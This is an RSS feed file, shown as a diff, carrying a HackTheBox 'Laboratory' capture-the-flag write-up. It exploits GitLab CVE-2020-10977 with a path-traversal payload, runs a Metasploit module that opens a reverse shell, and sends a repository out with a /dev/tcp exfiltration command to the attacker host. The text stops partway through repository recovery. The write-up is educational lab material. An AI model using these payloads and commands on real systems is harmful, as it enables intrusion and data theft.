@@ -1,0 +1,594 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>SUID on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/suid/</link>
+    <description>Recent content in SUID on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 17 Apr 2021 23:25:49 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/suid/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Laboratory</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</link>
+      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</guid>
+      <description>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&amp;rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container.
+Enumerating inside the container finds a private user repository that contains a pair of SSH keys.</description>
+      <content:encoded><![CDATA[<p>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container.</p>
+<p>Enumerating inside the container finds a private user repository that contains a pair of  SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key.  There is an SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Arbitrary File Read</li>
+<li>Metasploit</li>
+<li>Exploiting GitLab 12.8.1~12.9.0</li>
+<li>Recover git repository</li>
+<li>SUID exploitation</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>searchsploit - Preinstalled in Kali Linux</li>
+<li>Metasploit - Preinstalled in Kali Linux</li>
+<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
+$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp  open  http     Apache httpd 2.4.41
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: The Laboratory
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Issuer: commonName<span style="color:#f92672">=</span>laboratory.htb
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">4096</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-07-05T10:39:28
+| Not valid after:  2024-03-03T10:39:28
+| MD5:   <span style="color:#ae81ff">2873</span> 91a5 <span style="color:#ae81ff">5022</span> f323 4b95 df98 b61a eb6c
+|_SHA-1: <span style="color:#ae81ff">0875</span> 3a7e eef6 8f50 <span style="color:#ae81ff">0349</span> 510d 9fbf abc3 c70a a1ca
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
+<p>On the HTTPS port, the certificate discloses a subdomain.</p>
+<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
+$ echo <span style="color:#e6db74">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
+<p>There is nothing really interesting here.</p>
+<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
+</p>
+<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
+<p>A GitLab instance is presented on this page.</p>
+<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
+</p>
+<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
+<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
+</p>
+<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
+<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
+<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
+</p>
+<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
+<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
+</p>
+<h4 id="searchsploit">Searchsploit</h4>
+<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
+$ searchsploit gitlab
+------------------------------------------------------------------------- -----------------------------
+Exploit Title                                                           |  Path
+------------------------------------------------------------------------- -----------------------------
+GitLab - <span style="color:#e6db74">&#39;impersonate&#39;</span> Feature Privilege Escalation                      | ruby/webapps/40236.txt
+GitLab 11.4.7 - RCE <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                  | ruby/webapps/49334.py
+GitLab 11.4.7 - Remote Code Execution <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                | ruby/webapps/49257.py
+GitLab 12.9.0 - Arbitrary File Read                                      | ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span>                      | ruby/webapps/49076.py
+Gitlab 6.0 - Persistent Cross-Site Scripting                             | php/webapps/30329.sh
+Gitlab-shell - Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                               | linux/remote/34362.rb
+Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        | java/webapps/47927.txt
+NPMJS gitlabhook 0.0.17 - <span style="color:#e6db74">&#39;repository&#39;</span> Remote Command Execution          | json/webapps/47420.txt
+------------------------------------------------------------------------- ------------------------------
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-git">Shell as git</h3>
+<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
+<blockquote>
+<p>CVE-2020-10977:
+GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
+</blockquote>
+<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
+<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
+</p>
+<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">![<span style="color:#f92672">a</span>](<span style="color:#a6e22e">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
+</p>
+<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
+<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
+</p>
+<p>The payload will then turn into an attached file.</p>
+<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
+</p>
+<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
+<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
+</p>
+<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
+<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
+$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf
+
+...&lt;SNIP&gt;...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Target        : https://git.laboratory.htb
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username      : iamf
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password      : iamfiamf
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Project Names : ProjectOne, ProjectTwo
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying to Login...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login Successful!
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating ProjectOne...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ProjectOne Created Successfully!
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating ProjectTwo...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ProjectTwo Created Successfully!
+<span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Absolute Path to File : /etc/passwd
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Creating an Issue...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Issue Created Successfully!
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Moving Issue...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Issue Moved Successfully!
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd
+
+&gt; /etc/passwd
+----------------------------------------
+
+...&lt;SNIP&gt;...
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
+<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
+<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
+<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «laboratory» «10.10.14.39»
+$ cd /usr/share/metasploit-framework/modules/exploits/multi/http <span style="color:#f92672">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
+</code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
+$ msfdb reinit
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting database
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping databases <span style="color:#e6db74">&#39;msf&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping databases <span style="color:#e6db74">&#39;msf_test&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dropping database user <span style="color:#e6db74">&#39;msf&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Stopping database
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting database
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating database user <span style="color:#e6db74">&#39;msf&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating databases <span style="color:#e6db74">&#39;msf&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating databases <span style="color:#e6db74">&#39;msf_test&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating configuration file <span style="color:#e6db74">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Creating initial database schema
+</code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
+</code></pre></div><p>Below are the options needed by the module.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set USERNAME iamf
+USERNAME <span style="color:#f92672">=</span>&gt; iamf
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set PASSWORD iamfiamf
+PASSWORD <span style="color:#f92672">=</span>&gt; iamfiamf
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.10.216
+RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.10.216
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">443</span>
+RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">443</span>
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set SSL true
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Changing the SSL option’s value may require changing RPORT!
+SSL <span style="color:#f92672">=</span>&gt; true
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set VHOST git.laboratory.htb
+VHOST <span style="color:#f92672">=</span>&gt; git.laboratory.htb
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set LHOST tun0
+LHOST <span style="color:#f92672">=</span>&gt; tun0
+msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9001</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9001</span>
+</code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/gitlab_file_read_rce<span style="color:#f92672">)</span> &gt; run
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.39:9001 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing automatic check <span style="color:#f92672">(</span>disable AutoCheck to override<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Logged in to user iamf
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created project /iamf/hpt2TORA
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created project /iamf/ysGE0u0L
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Created issue /iamf/hpt2TORA/issues/1
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing arbitrary file load
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File saved as: <span style="color:#e6db74">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to delete project /iamf/hpt2TORA
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Deleted project /iamf/hpt2TORA
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to delete project /iamf/ysGE0u0L
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Deleted project /iamf/ysGE0u0L
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.39:9001 -&gt; 10.10.10.216:52726<span style="color:#f92672">)</span> at 2021-03-21 17:46:14 -0400
+
+id;hostname
+uid<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>998<span style="color:#f92672">(</span>git<span style="color:#f92672">)</span>
+git.laboratory.htb
+</code></pre></div><p>I have shell as user <code>git</code>.</p>
+<p>There is a <code>.dockerenv</code> file in the root directory. This indicates that I&rsquo;m inside a docker container.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ls -la /
+total <span style="color:#ae81ff">88</span>
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> ..
+-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2020</span> .dockerenv
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">157</span> Feb <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> RELEASE
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> assets
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-dexter">Shell as dexter</h3>
+<h4 id="container-enumeration">Container enumeration</h4>
+<p>Enumerating the <code>git</code> home directory (<code>/var/opt/gitlab</code>) discovers two repositories that belongs to user <code>dexter</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~$ grep -Ri dexter 2&gt;/dev/null
+
+git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config:        fullpath <span style="color:#f92672">=</span> dexter/securedocker
+git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config:        fullpath <span style="color:#f92672">=</span> dexter/securewebsite
+</code></pre></div><p>I haven&rsquo;t seen that <code>dexter/securedocker</code> before in the GitLab application. So I&rsquo;ll grab that repository and transfer it to my machine</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+total <span style="color:#ae81ff">40</span>
+drwxr-s---  <span style="color:#ae81ff">6</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-s---  <span style="color:#ae81ff">4</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> ..
+-rw-r--r--  <span style="color:#ae81ff">1</span> git root   <span style="color:#ae81ff">23</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> HEAD
+-rw-r--r--  <span style="color:#ae81ff">1</span> git root  <span style="color:#ae81ff">107</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> config
+-rw-r--r--  <span style="color:#ae81ff">1</span> git root   <span style="color:#ae81ff">73</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> description
+drwxr-sr-x  <span style="color:#ae81ff">2</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> hooks
+drwxr-sr-x  <span style="color:#ae81ff">2</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> info
+-rw-r--r--  <span style="color:#ae81ff">1</span> git root  <span style="color:#ae81ff">112</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> language-stats.cache
+drwxr-sr-x <span style="color:#ae81ff">14</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> objects
+drwxr-sr-x  <span style="color:#ae81ff">4</span> git root <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2020</span> refs
+</code></pre></div><p>First, I’ll create a tarball archive of that repository and I’ll name it as <code>exfil-securedocker-git.tar</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+</code></pre></div><p>On my machine, I&rsquo;ll setup a listener</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
+$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; exfil-securedocker-git.tar
+</code></pre></div><p>Back on Laboratory, I’ll send the repository  tarball to my machine using <code>cat</code> and <code>bash</code> trick</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar &gt; /dev/tcp/10.10.14.39/9000
+</code></pre></div><p>My listener received the tarball.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
+$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; exfil-securedocker-git.tar
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.216<span style="color:#f92672">]</span> <span style="color:#ae81ff">42426</span>
+</code></pre></div><h4 id="recover-securedocker-repository">Recover &lsquo;securedocker&rsquo; repository</h4>
+<p>After extracting the repository, I saw <code>git:(master)</code> pop up in my zsh prompt which indicates this is a git repository.</p>
+<p>But, when I try to read the repository status, it returns an error message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.39»
+$ tar -xzf exfil-securedocker-git.tar
+
+→ root@iamf «loot» «10.10.14.39»
+$ cd 19581e27de7ced....5ef03f7c3017bb5b7.git
+
+→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+$ git status
+fatal: this operation must be run in a work tree
+</code></pre></div><blockquote>
+<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
+</blockquote>
+<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+$ mkdir .git
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+$ mv * .git
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+$ git status
+fatal: this operation must be run in a work tree
+</code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span>
+$ git init
+Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docer.git/.git/
+
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ git status
+On branch master
